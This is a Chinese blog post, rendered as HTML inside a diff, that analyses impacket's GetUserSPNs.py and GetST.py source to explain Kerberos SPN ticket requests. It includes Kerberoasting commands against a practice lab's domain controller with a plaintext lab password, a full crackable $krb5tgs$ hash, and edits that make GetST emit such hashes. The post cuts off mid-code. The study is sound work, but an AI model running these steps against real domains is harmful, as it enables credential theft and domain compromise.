@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言之前一直疑惑，网上都在说，通过这个去请求服务的TGS1proxychains GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab&#x2F;zhangjian:i9XDE02pLVf -request-user chenchen但是上面的命令又是-request-user，去请求用户，就搞得我很迷糊，最终还是通过查看源码，大概搞懂了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从impacket源码分析SPN">
+<meta property="og:url" content="http://example.com/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/index.html">
+<meta property="og:site_name" content="kaikaix">
+<meta property="og:description" content="前言之前一直疑惑，网上都在说，通过这个去请求服务的TGS1proxychains GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab&#x2F;zhangjian:i9XDE02pLVf -request-user chenchen但是上面的命令又是-request-user，去请求用户，就搞得我很迷糊，最终还是通过查看源码，大概搞懂了">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/2.png">
+<meta property="og:image" content="http://example.com/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/3.png">
+<meta property="og:image" content="http://example.com/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/4.png">
+<meta property="og:image" content="http://example.com/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/5.png">
+<meta property="article:published_time" content="2023-10-25T06:35:57.000Z">
+<meta property="article:modified_time" content="2023-10-25T15:30:57.980Z">
+<meta property="article:author" content="kaikaix">
+<meta property="article:tag" content="python">
+<meta property="article:tag" content="域渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/2.png">
+
+<link rel="canonical" href="http://example.com/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>从impacket源码分析SPN | kaikaix</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="kaikaix" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">kaikaix</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">小白</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/kaikaix" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/cat.jpg">
+      <meta itemprop="name" content="kaikaix">
+      <meta itemprop="description" content="小白">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="kaikaix">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          从impacket源码分析SPN
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-10-25 14:35:57 / 修改时间：23:30:57" itemprop="dateCreated datePublished" datetime="2023-10-25T14:35:57+08:00">2023-10-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">域渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前一直疑惑，网上都在说，通过这个去请求服务的TGS<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen</span><br></pre></td></tr></table></figure><br>但是上面的命令又是-request-user，去请求用户，就搞得我很迷糊，最终还是通过查看源码，大概搞懂了<br><span id="more"></span></p>
+<h1 id="SPN简介"><a href="#SPN简介" class="headerlink" title="SPN简介"></a>SPN简介</h1><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN<br>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下<br>当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下<br>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p>
+<h1 id="SPN-格式"><a href="#SPN-格式" class="headerlink" title="SPN 格式"></a>SPN 格式</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serviceclass/host:port/servicename</span><br></pre></td></tr></table></figure>
+<p>可以通过 <code>setspn -A MSSQLSvc/DM.test.local:1433 sqladmin</code> 注册一个名为MSSQLSvc的SPN，将他分配给sqladmin这个域管账户</p>
+<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>之前打靶场遇到了一个问题<br><code>proxychains GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen</code><br>通过上面的命令获取到了chenchen的ST，但是从上文说的，SPN是服务的标识符，那我怎么会获取到绑定该服务的域用户的ST，按理应该是获取到服务的ST才对</p>
+<h2 id="GetUserSPNs源码简析"><a href="#GetUserSPNs源码简析" class="headerlink" title="GetUserSPNs源码简析"></a>GetUserSPNs源码简析</h2><p>接下来看看<code>GetUserSPNs.py</code>的关键源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">TGT = self.getTGT()</span><br><span class="line"><span class="keyword">if</span> self.__outputFileName <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    fd = <span class="built_in">open</span>(self.__outputFileName, <span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    fd = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user, SPN <span class="keyword">in</span> users.items():</span><br><span class="line">    sAMAccountName = user</span><br><span class="line">    downLevelLogonName = self.__targetDomain + <span class="string">&quot;\\&quot;</span> + sAMAccountName</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        principalName = Principal()</span><br><span class="line">        principalName.<span class="built_in">type</span> = constants.PrincipalNameType.NT_MS_PRINCIPAL.value</span><br><span class="line">        principalName.components = [downLevelLogonName]</span><br><span class="line"></span><br><span class="line">        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,self.__kdcIP,TGT[<span class="string">&#x27;KDC_REP&#x27;</span>], TGT[<span class="string">&#x27;cipher&#x27;</span>],TGT[<span class="string">&#x27;sessionKey&#x27;</span>])</span><br><span class="line"></span><br><span class="line">        self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,</span><br><span class="line">                        self.__targetDomain + <span class="string">&quot;/&quot;</span> + sAMAccountName, fd)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.debug(<span class="string">&quot;Exception:&quot;</span>, exc_info=<span class="literal">True</span>)</span><br><span class="line">        logging.error(<span class="string">&#x27;Principal: %s - %s&#x27;</span> % (downLevelLogonName, <span class="built_in">str</span>(e)))</span><br></pre></td></tr></table></figure><br>先获取<code>TGT</code>。<br>接下来通过这行代码获取TGS<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(principalName, self.__domain,self.__kdcIP,TGT[<span class="string">&#x27;KDC_REP&#x27;</span>], TGT[<span class="string">&#x27;cipher&#x27;</span>],TGT[<span class="string">&#x27;sessionKey&#x27;</span>])</span><br></pre></td></tr></table></figure><br>而且是用<code>user</code>，获取到<code>TGS</code>。<br>而for循环中的<code>SPN</code>是没有使用到的。</p>
+<p>在这段代码最后<code>self.outputTGS</code>打印出你要请求的用户的<code>TGS</code></p>
+<h2 id="GetST源码简析"><a href="#GetST源码简析" class="headerlink" title="GetST源码简析"></a>GetST源码简析</h2><p>上面的很容易理解，接下来看看<code>GetST</code>的源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> TGT <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    tgt, cipher, sessionKey = TGT[<span class="string">&#x27;KDC_REP&#x27;</span>], TGT[<span class="string">&#x27;cipher&#x27;</span>], TGT[<span class="string">&#x27;sessionKey&#x27;</span>]</span><br><span class="line">    oldSessionKey = sessionKey</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> tgt <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># Still no TGT</span></span><br><span class="line">    userName = Principal(self.__user, <span class="built_in">type</span>=constants.PrincipalNameType.NT_PRINCIPAL.value)</span><br><span class="line">    logging.info(<span class="string">&#x27;Getting TGT for user&#x27;</span>)</span><br><span class="line">    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,</span><br><span class="line">                                                            unhexlify(self.__lmhash), unhexlify(self.__nthash),</span><br><span class="line">                                                            self.__aesKey,</span><br><span class="line">                                                            self.__kdcHost)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ok, we have valid TGT, let&#x27;s try to get a service ticket</span></span><br><span class="line"><span class="keyword">if</span> self.__options.impersonate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="comment"># Normal TGS interaction</span></span><br><span class="line">    logging.info(<span class="string">&#x27;Getting ST for user&#x27;</span>)</span><br><span class="line">    serverName = Principal(self.__options.spn, <span class="built_in">type</span>=constants.PrincipalNameType.NT_SRV_INST.value)</span><br><span class="line">    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(serverName, domain, self.__kdcHost, tgt, cipher, sessionKey)</span><br><span class="line">    </span><br><span class="line">    self.__saveFileName = self.__user</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># Here&#x27;s the rock&#x27;n&#x27;roll</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        logging.info(<span class="string">&#x27;Impersonating %s&#x27;</span> % self.__options.impersonate)</span><br><span class="line">        <span class="comment"># Editing below to pass hashes for decryption</span></span><br><span class="line">        <span class="keyword">if</span> self.__additional_ticket <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            tgs, cipher, oldSessionKey, sessionKey = self.doS4U2ProxyWithAdditionalTicket(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey,</span><br><span class="line">                                                                                            self.__kdcHost, self.__additional_ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tgs, cipher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey, unhexlify(self.__nthash), self.__aesKey, self.__kdcHost)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.debug(<span class="string">&quot;Exception&quot;</span>, exc_info=<span class="literal">True</span>)</span><br><span class="line">        logging.error(<span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;KDC_ERR_S_PRINCIPAL_UNKNOWN&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Probably user %s does not have constrained delegation permisions or impersonated user does not exist&#x27;</span> % self.__user)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(e).find(<span class="string">&#x27;KDC_ERR_BADOPTION&#x27;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            logging.error(<span class="string">&#x27;Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable&#x27;</span> % self.__user)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    self.__saveFileName = self.__options.impersonate</span><br><span class="line"></span><br><span class="line">self.saveTicket(tgs, oldSessionKey)</span><br></pre></td></tr></table></figure><br>与<code>GetUserSPNs</code>相似，也是获取到<code>TGT</code>后，判断你的命令中是否有委派（这里不对委派做介绍），如果没有委派就与<code>GetUserSPNs</code>一样，通过<code>getKerberosTGS</code>获取ST。<br>但是有一点不同的地方<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Principal(self.__options.spn, <span class="built_in">type</span>=constants.PrincipalNameType.NT_SRV_INST.value)</span><br></pre></td></tr></table></figure><br>在这一行，可以看到他用到了<code>spn</code>，并且没有用到过<code>user</code></p>
+<p>在代码的最后，与<code>GetUserSPNs</code>不一样，他是保存ST<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.saveTicket(tgs, oldSessionKey)</span><br></pre></td></tr></table></figure></p>
+<p>看看具体代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">saveTicket</span>(<span class="params">self, ticket, sessionKey</span>):</span><br><span class="line">    logging.info(<span class="string">&#x27;Saving ticket in %s&#x27;</span> % (self.__saveFileName + <span class="string">&#x27;.ccache&#x27;</span>))</span><br><span class="line">    ccache = CCache()</span><br><span class="line"></span><br><span class="line">    ccache.fromTGS(ticket, sessionKey, sessionKey)</span><br><span class="line">    ccache.saveFile(self.__saveFileName + <span class="string">&#x27;.ccache&#x27;</span>)</span><br></pre></td></tr></table></figure><br>他把ST保存成了<code>ccache</code></p>
+<h1 id="SPN-or-Users"><a href="#SPN-or-Users" class="headerlink" title="SPN or Users"></a>SPN or Users</h1><p>按照上面的源码分析，那<code>GetST</code>和<code>GetUserSPNs</code>，应该是不一样的。接下来用一个真实环境来验证一下，我这里用的云镜的<strong>Certify</strong>。</p>
+<h2 id="获取SPN"><a href="#获取SPN" class="headerlink" title="获取SPN"></a>获取SPN</h2><p>首先获取SPN和对应的user<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/2.png" alt></p>
+<h2 id="GetUserSPNs"><a href="#GetUserSPNs" class="headerlink" title="GetUserSPNs"></a>GetUserSPNs</h2><p>通过<code>GetUserSPNs</code>获取user的ST<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 GetUserSPNs.py -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf -request-user chenchen</span><br></pre></td></tr></table></figure></p>
+<p>ST<br><div class="spoiler collapsed">
+    <div class="spoiler-title">
+        点击显/隐内容
+    </div>
+    <div class="spoiler-content">
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$krb5tgs$23$*chenchen$XIAORANG.LAB$xiaorang.lab/chenchen*$7fa0e479f4b98d330648eace979d6899$ef080eb849dde02f3bc909fcb96bb9415c1845edcd907856ecf1a56b6c2af338afffaf7adfb5dc66cfc0dd75bf37a81eda6b6c4542167096e9095eaf7142107b9a2ec26e556090647df180b522ab8a14e19db9a47bb69a16910f7a9e67301dc8b6fb5bb05593651d96238a03475dc6f0a94802301f65decb2b28c8d3e1d5f5d1413e58c6484afa1e53deef504ff0b9d22000519954d09d491f3b707c394248cff0230c2684940b93a881cafb440b4cfe0db4bd45aaa5cd001f91f97291e45506c3d892fd44e27fb6102c242a7023e6b3f25d942d5ca0b321562d955ec8ec750d22a00d9d1aae2f11731770ac7ec39352f8f15fc3223fcee9648870e0d5ff89e64e1e1b6532ae311d086c64bc6ccad31e2eb60e83778927f17880319185bcab68121bd7ee13c0576d174fa91573b6f010f151d807e962870d3e00cd0ae20ccaa2c018ce8d0027cc6795794430c2824dc331ebff70f6d34f43548e1728329840d6fc0309fa97b3d0e77f71d15df082d84561322255fc8b29fce8a922c1e8a34a75de5c764f8d8dc3449aa6359c9b26ff8b779443d46c19220424916bdff44fb939ad69a59fd48a4df5b01eaf1c80a5955994d26880585dd19da25717e395828be889ec279ab254fc220e87acf092ce2f33a98016b38d2556f98f6b4c1a31ff309821d01f3ed2746d7b32967e6f632c39c08f9ac4a53626dd5d2d6836415bc83bf3918f640a4ac71afb6190db79828f7d0775799e412481e4bd84625b23ac96ba168e52693454762c47a13b10120b379db043d8f90b4bd5b998c7e84aab8d65261499d434f5c63c8e8bf43ee4133417fb5b04a86df9926dee30465283566a76b38f004f86e9891ce9a353713d665992695a829756b9b15ca6de95b04cd4e3a2d18767a054018f24bef9a5e40cc8f11ee01b736fefa56e05b3cd2768c0904f7545c731b26a12f311ba7fb40a36ef7eaa57b791bb2484fd98f661d10081b852206d67ddde737d3fdadb920027bf0c611c4b320da0883a075f1150f69d76d39977e3714a10659a69b339f67d6a550e3d84fd9bcf9b54297ac8f17b3202040a6af2bd0250f4495c32c46674ba661932f017d39b462a0c12c21536dfd3be2e6812623cf640f04b74c5de1eaed0be56e2230815dce87a3e7a96973d8ccaa781e65f66004c5ac9dba83a94e33f6c0bde7337a5924637d67777e5ec649b165e20180dd3a2c6f1593bd051beba17b23e0946cc4a48fd32cc3641cded1bb0e526c53d5c8fca3a5d5811f98aa59f1e5f7d086cd139e6b9790f06f1089ee1b3c959bc431949dca81261e21a4646ad0c6d4e42bd0682432bdde3f379c48958903d3dbe96565b80c18bf6334877f8f5057ee198da600ac9234bce72a8e180139df5ded784f06a4b01799a8c8651ad69d211520b06c58aa981c7591b1efcbe95a367eac90548b6d2bc594c710bde364ba58087bf5b8b53727b69139d201ddbf15aa745289a70fda4a824ca5239bcfee7ac22ec9bbb9ec6</span><br></pre></td></tr></table></figure>
+    </div>
+</div></p>
+<h2 id="GetST"><a href="#GetST" class="headerlink" title="GetST"></a>GetST</h2><p>通过<code>GetST</code>获取<code>SPN</code>的st<br>因为他有一个转换<code>ccache</code>的过程，所以要把他代码改一下<br><img src="/2023/10/25/%E4%BB%8Eimpacket%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90SPN/3.png" alt><br>增加一行<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self.outputTGS(tgs, oldSessionKey, sessionKey, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
+<p>并把下面的代码粘贴到类里面</p>
+<div class="spoiler collapsed">
+    <div class="spoiler-title">
+        点击显/隐内容
+    </div>
+    <div class="spoiler-content">
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">outputTGS</span>(<span class="params">self, tgs, oldSessionKey, sessionKey, username, spn, fd=<span class="literal">None</span></span>):</span><br><span class="line">        decodedTGS = decoder.decode(tgs, asn1Spec=TGS_REP())[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># According to RFC4757 